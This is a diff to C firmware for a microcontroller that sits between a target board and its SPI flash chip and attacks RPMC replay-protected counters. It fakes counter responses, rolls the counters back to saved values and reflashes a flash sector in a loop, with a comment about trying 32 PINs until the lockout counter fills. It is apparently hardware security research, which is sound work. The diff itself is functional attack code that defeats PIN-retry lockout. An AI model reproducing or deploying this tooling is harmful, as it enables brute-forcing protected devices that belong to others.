@@ -48,6 +48,8 @@ bi_decl(bi_1pin_with_name(PIN_MUX_INTERPOSE, "MUX switch (0 is target, 1 is pico
 #define PIN_PICO_CHIP_SPI_CLK 34
 #define PIN_PICO_CHIP_SPI_TX 35
 
+#define PIN_TARGET_POWER_SWITCH 39
+
 #define HMAC_KEY_SIZE 32
 
 void error(const char * msg)
@@ -106,7 +108,8 @@ void __time_critical_func(rpmc_interpose_increment_core1)(void)
 }
 #endif
 
-static uint32_t counter_values[4] = {0x0CF6, 0x0CD4, 0, 0};
+static const uint32_t rollback_values[] = {0xCF6, 0xCD4};
+static uint32_t counter_values[] = {0xCF6, 0xCD4};
 // Keys for key_data 01000000
 #define USE_KEYS_FRAMEWORK_2
 const static uint8_t hmac_keys[4 * HMAC_KEY_SIZE] = {
@@ -222,13 +225,13 @@ static_assert(sizeof(wait_msg) % 4 == 0);
 static_assert(sizeof(done_update_msg) % 4 == 0);
 static_assert(sizeof(done_update_msg) % 52 == 0);
 
-void __time_critical_func(interpose_intel)()
+void interpose_intel()
 {
     struct rpmc_command_info info;
     info.dummy[0] = 0xFF; // done_msg[0];
     info.dummy[1] = 0xFF; // done_msg[1];
 
-    set_sys_clock_khz(250000, true);
+    //set_sys_clock_khz(250000, true);
 
     /*
      * Intel strategy: let all OP1s pass, but fake the OP2 responses for request
@@ -356,6 +359,11 @@ void __time_critical_func(interpose_intel)()
             // fill the FIFO with a busy wait message again
             pio_sm_put_blocking(interposer_inst.pio, interposer_inst.sm, (8 - 1));
             pio_sm_put_byte_blocking(interposer_inst.pio, interposer_inst.sm, WAIT);
+
+            if (inc.idx == 1 && counter_values[1] >= rollback_values[1] + 37) {
+                // we tried 32 pins, lockout counter is full
+                return;
+            }
         }
     }
 
@@ -593,33 +601,11 @@ void init_lls(const bool lls1_dir, const bool lss2_dir)
 
 void init_spi0_master()
 {
-    spi_init(CAPTURE_SPI, 1 * 1000 * 1000);
+    printf("baud rate: %u\n", spi_init(CAPTURE_SPI, 2 * 1000 * 1000));
 
     gpio_init(PIN_PICO_CHIP_SPI_CS);
     gpio_set_dir(PIN_PICO_CHIP_SPI_CS, GPIO_OUT);
     gpio_put(PIN_PICO_CHIP_SPI_CS, 1);
-    sleep_us(10);
-    gpio_put(PIN_PICO_CHIP_SPI_CS, 0);
-    sleep_us(10);
-    gpio_put(PIN_PICO_CHIP_SPI_CS, 1);
-
-    gpio_init(PIN_PICO_CHIP_SPI_CLK);
-    gpio_set_dir(PIN_PICO_CHIP_SPI_CLK, GPIO_OUT);
-    gpio_put(PIN_PICO_CHIP_SPI_CLK, 1);
-    sleep_us(10);
-    gpio_put(PIN_PICO_CHIP_SPI_CLK, 0);
-
-    gpio_init(PIN_PICO_CHIP_SPI_RX);
-    gpio_set_dir(PIN_PICO_CHIP_SPI_RX, GPIO_OUT);
-    gpio_put(PIN_PICO_CHIP_SPI_RX, 1);
-    sleep_us(10);
-    gpio_put(PIN_PICO_CHIP_SPI_RX, 0);
-
-    gpio_init(PIN_PICO_CHIP_SPI_TX);
-    gpio_set_dir(PIN_PICO_CHIP_SPI_TX, GPIO_OUT);
-    gpio_put(PIN_PICO_CHIP_SPI_TX, 1);
-    sleep_us(10);
-    gpio_put(PIN_PICO_CHIP_SPI_TX, 0);
 
     // We can't use the SPI function because then every byte will be send in a
     // separate CS transaction
@@ -721,6 +707,39 @@ int main()
     gpio_set_slew_rate(PIN_PICO_DEBUG_PIN, GPIO_SLEW_RATE_FAST);
 #endif
 
+#if 0
+    gpio_init(PIN_TARGET_POWER_SWITCH);
+    gpio_set_dir(PIN_PICO_DEBUG_PIN, GPIO_OUT);
+#endif
+
+    // toggle the mux pin once so that we can see that the pcbite sits correctly
+    // probe the mux
+    gpio_put(PIN_MUX_INTERPOSE, 0);
+    gpio_put(PIN_MUX_INTERPOSE, 1);
+    sleep_us(100);
+    for (unsigned i = 0; i < 10; ++i) {
+        gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
+        sleep_us(1);
+        gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 0);
+    }
+    sleep_us(100);
+    gpio_put(PIN_MUX_INTERPOSE, 0);
+
+#ifdef PIN_PICO_DEBUG_PIN
+    gpio_put(PIN_PICO_DEBUG_PIN, 1);
+    sleep_us(100);
+    gpio_put(PIN_PICO_DEBUG_PIN, 0);
+#endif
+
+    // Overclock
+    set_sys_clock_khz(250000, true);
+
+    // mux on and MISO 0xFF by default
+    gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
+    gpio_put(PIN_MUX_INTERPOSE, 1);
+
+switch_case:
+    printf("Enter option [ir]\n");
     switch (getchar()) {
         // interpose amd 
         case 'a':
@@ -737,26 +756,12 @@ int main()
 #endif
             break;
         case 'i':
-            // toggle the mux pin once so that we can see that the pcbite sits
-            // correctly
-            gpio_put(PIN_MUX_INTERPOSE, 0);
-            gpio_put(PIN_MUX_INTERPOSE, 1);
-            sleep_us(100);
-            for (unsigned i = 0; i < 10; ++i) {
-                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
-                sleep_us(1);
-                gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 0);
-            }
-            sleep_us(100);
-            gpio_put(PIN_MUX_INTERPOSE, 0);
+interpose_intel_case:
+            printf("Press a key once board is off\n");
+            getchar();
 
-#ifdef PIN_PICO_DEBUG_PIN
-            gpio_put(PIN_PICO_DEBUG_PIN, 1);
-            sleep_us(100);
-            gpio_put(PIN_PICO_DEBUG_PIN, 0);
-#endif
-
-            gpio_put(PIN_PICO_OUT_SPI_MISO_DQ1, 1);
+            // turn off mux
+            gpio_put(PIN_MUX_INTERPOSE, 0);
 
             rpmc_sniffer_init(PIN_PICO_BOARD_SPI_CS, PIN_PICO_BOARD_SPI_CLK, PIN_PICO_BOARD_SPI_MOSI_DQ0);
 #ifdef PIN_PICO_DEBUG_PIN
@@ -770,19 +775,33 @@ int main()
             printf("c1 = %08x\n", counter_values[1]);
 
             printf("Interposing Intel\n");
+            printf("Turn on target now\n");
 
-            //multicore_launch_core1(interpose_intel_core1);
             interpose_intel();
-            break;
+
+            // reset counter values
+            counter_values[0] = rollback_values[0];
+            counter_values[1] = rollback_values[1];
+
+            // TODO: one could probably leave these running after adjusting
+            //   some things but this less work for me right now
+            // tear down SMs
+            deinit(&rpmc_sniffer_inst);
+            deinit(&interposer_inst);
+            deinit(&increment_listener);
+
+            // intentional fallthrough
         case 'r':
             // Disconnect the chip from the board
             gpio_put(PIN_MUX_INTERPOSE, 1);
-
-            getchar();
+            sleep_ms(1);
 
             // Configure the spi pins
             init_spi0_master();
             sleep_us(100);
+
+            //printf("Connect pin header now and then press a key\n");
+            //getchar();
 
 #if 0
             flash_write_enable(MASTER_SPI, PIN_PICO_CHIP_SPI_CS);
@@ -795,9 +814,17 @@ int main()
             const uint8_t dummy[] = { 0xCA, 0xFE, 0xBA, 0xBE };
             write_segment(MASTER_SPI, PIN_PICO_CHIP_SPI_CS, 0x0, sizeof(dummy), dummy);
 #endif
-            printf("Reprogramming flash sector\n");
+            printf("Reprogramming flash sector...\n");
             reprogram_flash(MASTER_SPI, PIN_PICO_CHIP_SPI_CS);
             printf("done\n");
+
+            gpio_set_highz(PIN_PICO_CHIP_SPI_RX);
+            gpio_set_highz(PIN_PICO_CHIP_SPI_CS);
+            gpio_set_highz(PIN_PICO_CHIP_SPI_CLK);
+            gpio_set_highz(PIN_PICO_CHIP_SPI_TX);
+
+            // restart
+            goto interpose_intel_case;
             break;
         case 't':
             printf("Test\n");
@@ -806,7 +833,7 @@ int main()
 
             while (getchar()) {
                 printf("Toggle\n");
-                gpio_xor_mask((1 << PIN_MUX_INTERPOSE));
+                gpio_xor_mask((1 << PIN_MUX_INTERPOSE) | (1 << PIN_CHIP_VOLT_SEL));
             }
             break;
         default: // do nothing just leave chip directly connected
@@ -815,6 +842,7 @@ int main()
             printf("Just passing traffic through\n");
             break;
     }
+    goto switch_case;
 
     while (true)
         tight_loop_contents();
